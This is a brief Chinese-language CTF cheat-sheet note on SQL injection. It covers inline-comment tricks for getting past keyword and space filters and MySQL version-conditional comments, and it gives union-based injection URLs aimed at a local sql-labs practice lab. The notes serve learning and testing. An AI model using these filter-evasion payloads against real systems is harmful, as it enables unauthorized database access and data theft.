---
tags:
  - SQL
  - CTF
title: SQL速查表
---
来源
http://drops.xmd5.com/static/drops/tips-7840.html
来源(http://drops.xmd5.com/static/drops/tips-7840.html)



# 行内注释
- `/*注释内容*/`(适用于MYSQL和SQL Sever)
    - `DROP/*comment*/sampletable`
    - `DR/**/OP/*绕过过滤*/sampletable`
    - `SELECT/*替换空格*/password/**/FROM/**/Members`

MySQL专属
`select /*!80012 1/0,*/`
当MySQL版本大于80012（8.0.12）时，注释内的语句会被执行
以sql-labs为例
- mysql版本为5.7.26（50726）
- http://localhost/sql-labs/Less-2/?id=-1 union SELECT /*!80012 1/0, version(),database()*/
![](图片/Pasted%20image%2020241201092635.png)
sql语句错误
- http://localhost/sql-labs/Less-2/?id=-1 union SELECT /*!50726 1/0, version(),database()*/
![](图片/Pasted%20image%2020241201092651.png)
sql语句可以执行

